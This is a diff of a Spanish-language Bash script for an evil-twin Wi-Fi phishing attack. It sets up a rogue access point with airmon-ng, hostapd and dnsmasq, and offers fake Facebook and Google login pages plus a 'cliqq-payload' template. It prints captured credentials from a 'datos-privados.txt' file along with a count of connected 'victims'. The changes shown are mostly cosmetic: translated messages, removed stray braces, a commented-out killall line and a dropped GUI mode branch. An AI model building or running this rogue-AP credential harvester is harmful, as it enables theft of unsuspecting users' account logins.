@@ -5,7 +5,7 @@
 trap ctrl_c INT
 
 function ctrl_c(){
-	echo -e "\n\n[*]Exiting...\n"
+	echo -e "\n\n[*]Saliendo...\n"
 	rm dnsmasq.conf hostapd.conf 2>/dev/null
 	rm -r iface 2>/dev/null
 	find \-name datos-privados.txt | xargs rm 2>/dev/null
@@ -46,7 +46,7 @@ function getCredentials(){
 	tput civis; while true; do
 		echo -e "\n[*] Esperando credenciales (Ctr+C para finalizar)...\n"
 		for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
-		echo -e "Víctimas conectadas: }$activeHosts\n"
+		echo -e "Víctimas conectadas: $activeHosts\n"
 		find \-name datos-privados.txt | xargs cat 2>/dev/null
 		for i in $(seq 1 60); do echo -ne "-"; done && echo -e ""
 		activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
@@ -64,11 +64,11 @@ function startAttack(){
 	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
 	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
 	counter=1; for interface in $(cat iface); do
-		echo -e "\t\n}$counter. $interface"; sleep 0.26
+		echo -e "\t\n$counter. $interface"; sleep 0.26
 		let counter++
 	done; tput cnorm
 	checker=0; while [ $checker -ne 1 ]; do
-		echo -ne "\n[*]} Nombre de la interfaz (Ej: wlan0mon): " && read choosed_interface
+		echo -ne "\n[*] Nombre de la interfaz (Ej: wlan0mon): " && read choosed_interface
 
 		for interface in $(cat iface); do
 			if [ "$choosed_interface" == "$interface" ]; then
@@ -81,8 +81,7 @@ function startAttack(){
 	echo -ne "\n[*] Nombre del punto de acceso a utilizar (Ej: wifiGratis): " && read -r use_ssid
 	echo -ne "[*] Canal a utilizar (1-12): " && read use_channel; tput civis
 	echo -e "\n[!] Matando todas las conexiones...\n"
-	sleep 2
-	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
+	# killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
 	sleep 2
 
 	echo -e "interface=$choosed_interface\n" > hostapd.conf
@@ -121,7 +120,7 @@ function startAttack(){
 	# Array de plantillas
 	plantillas=(facebook-login google-login cliqq-payload )
 
-	tput cnorm; echo -ne "\n}[Información] Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)\n\n"
+	tput cnorm; echo -ne "\n [Información] Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)\n\n"
 	echo -ne "[*] Plantilla a utilizar (facebook-login , google-login , cliqq-payload): " && read template
 
 	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
@@ -184,11 +183,6 @@ if [ "$(id -u)" == "0" ]; then
 			tput civis;
 			dependencies
 			startAttack
-		elif [ "$mode" == "gui" ]; then
-			guiMode
-		else
-			echo -e "Modo no conocido"
-			exit 1
 		fi
 	fi
 else
